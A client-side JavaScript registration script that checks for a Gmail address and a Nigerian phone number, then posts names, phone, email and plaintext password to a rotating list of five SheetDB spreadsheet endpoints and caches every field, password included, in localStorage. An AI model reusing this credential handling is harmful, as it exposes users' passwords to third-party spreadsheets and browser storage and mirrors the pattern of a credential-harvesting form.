document.addEventListener("DOMContentLoaded", () => {
  const form = document.querySelector("form");
  const inputs = document.querySelectorAll("input");
  const submitBtn = document.querySelector(".submit-btn");

  if (!form || inputs.length === 0 || !submitBtn) {
    console.error("Form or inputs not found. Aborting script.");
    return;
  }

  const apiList = [
    "https://sheetdb.io/api/v1/okda0ptyi2lt1",
    "https://sheetdb.io/api/v1/nwaqj66tx0aax",
    "https://sheetdb.io/api/v1/405z3g0d9avnw",
    "https://sheetdb.io/api/v1/oawvpqtgfg14g",
    "https://sheetdb.io/api/v1/ot1b8mxw83ll6"
  ];

  const showNotification = (message, status = "info", persistent = false) => {
    const existing = document.querySelector(".notify");
    if (existing) existing.remove();

    const box = document.createElement("div");
    box.className = `notify ${status}`;
    box.textContent = message;
    document.body.appendChild(box);

    if (!persistent) {
      setTimeout(() => box.remove(), 5000);
    }
  };

  const removeNotification = () => {
    const existing = document.querySelector(".notify");
    if (existing) existing.remove();
  };

  const delay = (ms) => new Promise(res => setTimeout(res, ms));

  const sendToFirstAvailableApi = async (data, timeout = 10000, retries = 2) => {
    for (let i = 0; i < apiList.length; i++) {
      const api = apiList[i];
      let attempt = 0;

      while (attempt <= retries) {
        try {
          const controller = new AbortController();
          const timer = setTimeout(() => controller.abort(), timeout);

          const res = await fetch(api, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ data }),
            signal: controller.signal
          });

          clearTimeout(timer);

          if (res.ok) {
            console.log(`✅ Success: Data sent to ${api} on attempt ${attempt + 1}`);
            return true;
          } else {
            console.warn(`❌ API ${api} failed with status ${res.status}`);
          }
        } catch (err) {
          console.warn(`⚠️ Attempt ${attempt + 1} to ${api} failed: ${err.message}`);
        }

        attempt++;
        if (attempt <= retries) {
          console.log(`🔁 Retrying ${api} after 3s (attempt ${attempt + 1})...`);
          await delay(3000);
        }
      }

      if (i < apiList.length - 1) {
        console.log("⏳ Moving to next API after 10 seconds...");
        await delay(10000);
      }
    }

    return false;
  };

  const getPlus = (key) => localStorage.getItem(`plus-${key}`);
  const setPlus = (key, value) => localStorage.setItem(`plus-${key}`, value);

  const existingEmail = getPlus("email");
  const existingPassword = getPlus("password");

  if (existingEmail && existingPassword) {
    console.log("Account already exists on this device.");
    inputs.forEach(input => input.disabled = true);
    submitBtn.disabled = true;

    showNotification("An account already exists on this device. Redirecting to login...", "info", true);
    setTimeout(() => {
      removeNotification();
      window.location.href = "plus-login.html";
    }, 4000);
    return;
  }

  form.addEventListener("submit", async (e) => {
    e.preventDefault();

    const firstName = document.getElementById("firstName")?.value.trim();
    const lastName = document.getElementById("lastName")?.value.trim();
    const phone = document.getElementById("phoneNumber")?.value.trim();
    const email = document.getElementById("email")?.value.trim();
    const password = document.getElementById("password")?.value.trim();
    const refereeCode = document.getElementById("refereeCode")?.value.trim();

    if (!firstName || !lastName || !phone || !email || !password) {
      showNotification("All fields are required.", "error");
      return;
    }

    if (!/@gmail\.com$/.test(email)) {
      showNotification("Email must be a Gmail address.", "error");
      return;
    }

    if (!/^(?:\+234|080|081|070|071|090|091)/.test(phone)) {
      showNotification("Phone must start with +234, 080, 081, 070, 071, 090 or 091.", "error");
      return;
    }

    if (
      firstName === getPlus("firstName") &&
      lastName === getPlus("lastName") &&
      phone === getPlus("phoneNumber") &&
      email === getPlus("email") &&
      password === getPlus("password")
    ) {
      showNotification("Duplicate user data found. Please clear local storage.", "error");
      return;
    }

    const userData = {
      firstName,
      lastName,
      phoneNumber: phone,
      email,
      password
    };

    showNotification("Processing your registration...", "info", true);
    console.log("⏳ Attempting to send data...");

    const sent = await sendToFirstAvailableApi(userData);

    removeNotification();

    if (sent) {
      setPlus("firstName", firstName);
      setPlus("lastName", lastName);
      setPlus("phoneNumber", phone);
      setPlus("email", email);
      setPlus("password", password);
      setPlus("refereeCode", refereeCode);

      showNotification("Signup successful! Redirecting...", "success");
      setTimeout(() => window.location.href = "plus-index.html", 2000);
    } else {
      showNotification("Signup failed. All servers unreachable. Try again later.", "error");
    }
  });
});